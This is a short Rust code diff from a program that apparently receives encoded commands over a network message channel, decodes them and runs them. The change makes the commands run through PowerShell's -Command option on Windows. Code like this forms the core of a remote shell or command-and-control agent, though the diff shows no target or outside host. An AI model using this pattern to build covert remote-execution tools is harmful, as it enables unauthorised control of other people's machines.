@@ -41,7 +41,7 @@ fn main() {
         let cmmd = decode((msg.to_text().unwrap()).to_string());
 
         // run the passed command and get output
-        let mut cmmd = cmmd.split(" ").collect::<Vec<&str>>();
+        let cmmd = cmmd.split(" ").collect::<Vec<&str>>();
         
         if cmmd.len() == 0 {
             continue; 
@@ -50,8 +50,9 @@ fn main() {
         println!("{:?}", cmmd);
 
         // replace command with cmd to run in windows
-        let output = Command::new(cmmd.remove(0))
+        let output = Command::new("powershell")
             .stdout(Stdio::piped())
+            .arg("-Command")
             .args(cmmd)
             .spawn();
         
